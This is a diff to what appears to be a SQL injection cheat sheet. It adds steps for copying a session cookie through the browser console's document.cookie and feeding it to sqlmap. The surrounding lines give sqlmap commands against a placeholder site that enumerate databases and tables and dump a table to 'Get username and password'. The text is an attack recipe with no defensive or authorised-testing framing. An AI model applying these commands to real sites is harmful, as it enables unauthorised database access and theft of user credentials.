@@ -702,6 +702,12 @@ run
 Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
 
+* get the cookie from website
+	- open inspect
+	- select console
+	- type "document.cookie"
+	- copy cookie
+
 4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
 
 5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
